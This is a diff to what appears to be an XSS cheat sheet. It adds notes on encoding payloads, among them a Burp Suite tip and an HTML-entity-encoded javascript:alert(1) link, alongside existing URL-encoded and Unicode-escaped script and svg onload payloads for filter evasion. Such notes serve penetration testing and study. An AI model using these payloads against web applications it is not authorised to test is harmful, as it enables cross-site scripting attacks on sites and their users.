@@ -32,6 +32,7 @@ Try to event handlers :
 ```
 or use encodes:
 ```js
+use Unicodes - UTF8 - UTF16 - UTF32
 %3cscript%3e
 %253cscript%253e
 &lt;script&gt;
@@ -39,6 +40,10 @@ or use encodes:
 %u003Csvg onload=alert(1)>
 %u3008svg onload=alert(2)> 
 %uFF1Csvg onload=alert(3)>
+
+Burp Suite > Convert Selection > HTML > HTML-encode all character
+<a href="javascript:alert(1)">Click</a> =
+&lt;&#97;&#32;&#104;&#114;&#101;&#102;&#61;&quot;&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;&quot;&gt;&#67;&#108;&#105;&#99;&#107;&lt;&#47;&#97;&gt;
 ```
 ### 3.If alert is encoded or deleted
 
